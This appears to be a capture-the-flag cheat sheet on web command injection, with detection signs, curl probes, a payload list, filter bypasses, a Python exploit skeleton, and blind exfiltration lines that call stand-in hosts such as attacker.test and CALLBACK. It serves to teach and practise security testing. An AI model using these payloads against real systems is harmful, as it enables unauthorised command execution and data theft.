# Web Command Injection

## When to suspect this

- Input is used for ping, traceroute, DNS lookup, image conversion, git, curl, tar, zip, date, exiftool, sendmail, LaTeX, or shell wrappers.
- Source uses `system`, `exec`, `popen`, `shell=True`, `child_process.exec`, backticks, `Runtime.exec`.
- Errors mention `/bin/sh`, `sh:`, `command not found`, exit codes, or stderr.
- Special chars like `;`, `|`, newline, backticks, `$()` change behavior.
- Response delay changes with `sleep`.

## Fast triage checklist

- Identify shell vs argv execution.
- Test harmless commands: `id`, `whoami`, `pwd`.
- Test output and blind/timing channels.
- Try separators: `;`, `&&`, `|`, newline, backticks, `$()`.
- Check blocked chars and whitespace handling.
- Check if parameter is filename, URL, host, metadata, archive member, or CLI option.
- Determine if command output is reflected, logged, saved, or only timing-based.

## Manual confirmation

```bash
URL='http://HOST/ping'
curl -sk "$URL?host=127.0.0.1;id"
curl -sk "$URL?host=127.0.0.1%0aid"
curl -sk "$URL?host=127.0.0.1|id"
curl -sk "$URL?host=127.0.0.1%26%26id"
curl -sk "$URL?host=127.0.0.1;sleep 3" -w 'time:%{time_total}\n' -o /dev/null
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/web/command_injection_probe.py](../scripts/web/command_injection_probe.py) | Probe separators safely | `python3 scripts/web/command_injection_probe.py --url 'http://HOST/ping?host=INJECT'` | Reflected `CTFPROBE` or timing |
| `curl` | Manual exact probes | `curl -sk "$URL?x=1%0aid"` | `uid=` or delay |
| Burp Repeater | Preserve auth/CSRF | Replace parameter with payload | Response delta |
| webhook/callback | Blind outbound proof | `curl http://CALLBACK/$(id)` | Callback received |

## Payload starter pack

Output:

```text
;id
|id
&&id
`id`
$(id)
%0aid
;cat /flag
;cat /flag*
```

Blind:

```text
;sleep 3
;nslookup $(whoami).attacker.test
;curl http://CALLBACK/$(id|base64 -w0)
```

Space bypass:

```text
{cat,/flag}
cat${IFS}/flag
cat</flag
X=$'cat\x20/flag';$X
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests, urllib.parse

URL = "http://HOST/ping?host=INJECT"
COOKIE = {"session": "COOKIE"}

def run(cmd):
    payload = "127.0.0.1;" + cmd
    target = URL.replace("INJECT", urllib.parse.quote(payload, safe=""))
    r = requests.get(target, cookies=COOKIE, timeout=10)
    print(r.status_code, len(r.text))
    print(r.text[:2000])

run("id")
run("cat /flag*")
```

## Escalation path

- If output is reflected, read flag directly or enumerate likely paths.
- If blind, exfiltrate via DNS/HTTP callbacks or timing.
- If chars are blocked, map allowed characters and use shell expansions.
- If command is argv-based, pivot to option injection or file names starting with `-`.
- If upload/converter, inject metadata or archive filenames.

## Common bypasses

- Newline `%0a` instead of `;`.
- `${IFS}` or tabs for spaces.
- Brace expansion `{cmd,arg}`.
- Base64 payload decode and pipe to shell.
- `sh -c` through allowed interpreters.
- Option injection: `--help`, `-o`, `--checkpoint-action`.
- Filename injection in tar/git/wget/sendmail.

## Rabbit holes

- Assuming no injection because `;` is blocked.
- Running destructive commands.
- Forgetting command output may be in generated file/log, not response.
- Trying reverse shells when `cat /flag` or ORW-style read is enough.
- Ignoring stderr differences.

## Final solve checklist

- You have a harmless command proof.
- You know reflected vs blind behavior.
- Payload avoids destructive side effects.
- Flag read/exfil path is minimal and reproducible.

